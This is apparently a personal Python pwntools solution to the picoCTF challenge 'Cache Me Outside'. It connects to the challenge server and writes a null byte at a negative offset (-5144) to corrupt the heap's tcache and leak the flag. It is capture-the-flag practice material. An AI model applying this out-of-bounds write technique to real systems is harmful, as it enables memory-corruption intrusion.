#cache me outside
import os
import struct
from pwn import *

level = "Cache Me Outside"
ip = "mercury.picoctf.net:49825"
os.chdir("/home/ayush/Work/picoCTF/BinaryExploitation/"+level)
print(os.getcwd())

context.arch = 'amd64'
binary = ELF("./binary")

# r = process("./binary")
# for _ in range(10):
#     r = remote(ip.split(':')[0], ip.split(':')[1])

#     r.sendlineafter("Address:", "-5143")

#     r.sendlineafter("Value:", "4")

#     output = r.recvall().decode('utf-8').split("_")
#     print(output)

#     r.close()

r = remote(ip.split(':')[0], ip.split(':')[1])

r.sendlineafter("Address:", "-5144")

r.sendlineafter("Value:", "\0")

output = r.recvall().decode('utf-8').split("_")
print(output)

r.close()
